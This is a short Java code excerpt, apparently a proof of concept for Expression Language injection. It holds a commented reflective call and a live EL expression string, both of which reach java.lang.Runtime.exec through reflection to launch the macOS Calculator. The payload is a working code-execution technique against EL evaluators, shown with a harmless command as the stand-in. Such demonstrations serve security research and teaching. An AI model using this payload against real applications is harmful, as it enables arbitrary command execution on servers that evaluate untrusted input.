...
public class ELExample {
    ...
    public static void main(String[] args) throws Exception {
        ...
        // Class.forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"open /System/Applications/Calculator.app");
        ...
        ValueExpression expr = factory.createValueExpression(context, "${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"open /System/Applications/Calculator.app\")}", int.class);
